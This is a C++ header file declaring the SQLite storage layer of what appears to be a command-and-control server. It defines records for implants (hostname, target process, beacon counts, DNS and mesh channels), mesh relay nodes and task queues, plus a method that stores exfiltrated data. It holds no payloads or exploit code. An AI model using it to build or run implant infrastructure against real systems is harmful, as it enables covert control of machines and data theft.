#pragma once

#include <cstdint>
#include <mutex>
#include <optional>
#include <string>
#include <vector>

#include <nlohmann/json.hpp>

#include "snake/protocol.hpp"

struct sqlite3;

namespace snake::store {

std::string format_sqlite_time(int64_t unix_nanos);

std::optional<int64_t> parse_sqlite_time(const std::string& s);

struct ImplantRecord {
    std::string id;
    std::string impl_type = "windows";
    std::string target_proc;
    std::string hostname;
    std::string arch;
    int64_t first_seen_ns = 0;
    int64_t last_seen_ns = 0;
    int beacon_count = 0;
    int tasks_sent = 0;
    int tasks_done = 0;
    double jitter_score = 0.0;
    bool dns_enabled = false;
    bool mesh_enabled = false;
    bool flagged = false;
    std::string node_id;
};

struct MeshNode {
    std::string id;
    std::string addr;
    std::string pubkey;
    int64_t last_seen_ns = 0;
    int implants = 0;
    std::string version;
};

struct Task {
    std::string id;
    std::string type;
    nlohmann::json payload = nlohmann::json(nullptr);
    int64_t ts = 0;
    std::optional<int> ttl;
    std::string channel = "primary";
    std::string status;
    nlohmann::json result = nlohmann::json(nullptr);
    bool has_result = false;
    int64_t created_at_ns = 0;
    int64_t executed_at_ns = 0;
    bool has_executed_at = false;
};

std::string task_to_json(const Task& t);

class Store {
public:
    Store() = default;
    ~Store();
    Store(const Store&) = delete;
    Store& operator=(const Store&) = delete;

    bool open(const std::string& path, std::string* err);
    void close();

    bool upsert_implant(const ImplantRecord& ir, std::string* err);
    std::optional<ImplantRecord> get_implant(const std::string& id, std::string* err);
    std::vector<ImplantRecord> list_implants(std::string* err);
    int implant_count(std::string* err);

    std::optional<Task> create_task(const std::string& implant_id, const std::string& type,
                                    const std::string& channel, const nlohmann::json& payload,
                                    std::string* err);
    std::vector<Task> pending_tasks(const std::string& implant_id, std::string* err);
    bool complete_task(const std::string& task_id, const protocol::TaskResult& result,
                       std::string* err);

    bool exfil_data(const std::string& implant_id, const std::string& data_type,
                    const std::string& channel, const std::string& data, std::string* err);
    bool upsert_mesh_node(const MeshNode& node, std::string* err);
    std::vector<MeshNode> list_mesh_nodes(std::string* err);

    bool query_raw(const std::string& sql, std::vector<std::vector<std::string>>* rows,
                   std::string* err);

private:
    bool migrate_locked(std::string* err);

    sqlite3* db_ = nullptr;
    std::mutex mu_;
};

}  // namespace snake::store
